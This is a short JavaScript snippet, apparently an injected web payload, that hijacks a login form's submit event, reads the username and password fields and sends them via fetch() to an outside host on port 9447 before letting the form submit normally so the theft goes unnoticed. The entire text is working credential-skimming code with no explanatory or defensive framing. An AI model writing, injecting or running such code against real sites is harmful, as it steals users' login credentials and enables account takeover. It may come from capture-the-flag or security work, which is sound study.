let steal = e => {
  e.preventDefault();
  let username = document.getElementsByName("username")[0].value;
  let password = document.getElementsByName("password")[0].value;
  fetch("http://v.mewy.pw:9447?username="+username+"&password="+password)
    .then((resp) => {
      setTimeout(() => {
        e.target.submit()
      }, 1000);
    })
    .catch((err) => {
      console.log("error caught");
      e.target.submit();
    });
};


document.querySelector("form").addEventListener("submit", steal, false);
document.getElementById("next").value = "/";
